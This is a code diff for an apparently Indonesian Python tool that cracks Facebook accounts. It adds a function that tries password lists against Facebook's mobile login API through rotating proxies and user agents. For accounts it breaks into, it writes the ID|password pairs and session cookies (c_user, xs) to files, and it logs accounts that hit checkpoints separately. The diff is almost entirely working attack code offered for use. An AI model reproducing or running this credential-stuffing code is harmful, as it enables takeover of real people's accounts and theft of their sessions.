@@ -1365,7 +1365,7 @@ def setting():
 
 
     # Input untuk metode login
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]IP[bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]messenger[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]IP[bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]API[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
     fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
     if fankylog in ["1", "01"]:
         method.append("fankygraph")
@@ -1507,7 +1507,7 @@ def metslow():
                 elif "fankybapi" in method:
                     pool.submit(fanky_b_api,idf,pwv)
                 elif "fankymess" in method:
-                    pool.submit(fankymess,idf,pwv)
+                    pool.submit(fanky_api,idf,pwv)
                 else:
                     pool.submit(fanky_b_api,idf,pwv)
                                     
@@ -1576,7 +1576,7 @@ def metcepat():
                 elif "fankybapi" in method:
                     pool.submit(fanky_b_api,idf,pwv)
                 elif "fankymess" in method:
-                    pool.submit(fankymess,idf,pwv)
+                    pool.submit(fanky_api,idf,pwv)
                 else:
                     pool.submit(fanky_b_api,idf,pwv)
     print("")
@@ -1756,7 +1756,54 @@ def fanb_graph(idf, pwv):
 			time.sleep(31)
 	loop += 1
 
-
+#-------------------[ CRACK-MAIN-API ]------------#
+def fanky_api(idf, pwv):
+    global loop, ok, cp
+    rr = random.randint
+    rc = random.choice
+    bo = random.choice([m, k, h, b, u, x])
+    ua = random.choice(ugen)
+    ua2 = random.choice(ugen)
+    ses = requests.Session()
+    prog.update(des, description=f" {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    for pw in pwv:
+        try:
+            if 'ya' in ualuh:ua = ualu[0]
+            nip = random.choice(prox)
+            proxs = {'http': 'socks5://' + nip}
+            data = {'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d', 'email': idf, 'password': pw, 'credentials_type': 'password', 'generate_session_cookies': '1', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'device_id': '1234567890abcdef', 'cpl': 'true', 'try_num': '1', 'family_device_id': '1234567890abcdef', 'login_latitude': '0.0', 'login_longitude': '0.0', 'login_location_accuracy_m': '1.0', 'generate_machine_id': '1', 'generate_analytics_claim': '1', 'meta_inf_fbmeta': ''}
+            api_secret = '62f8ce9f74b12f84c123cc23437a4a32'
+            data['sig'] = hashlib.md5((''.join(f'{k}={data[k]}' for k in sorted(data)) + api_secret).encode()).hexdigest()
+            head = {'User-Agent': ua, 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'ef0e330bff1cd312f36aa5f2c69c59a9', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'keep-alive', 'Accept-Encoding': 'gzip, deflate'}
+            fan = ses.post('https://api.facebook.com/restserver.php', data=data, headers=headers, verify=True)
+            result = fan.json()
+            if "error_msg" in result and "User must verify their account" in result["error_msg"]:
+                cp += 1
+                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                break
+            elif "access_token" in result:
+                ok += 1
+                coki = ses.cookies.get_dict()
+                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
+                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop += 1
 #-------------------[ CRACK-MAIN ]------------#
 def fankygraphv1(idf, pwv, url):
     global loop, ok, cp
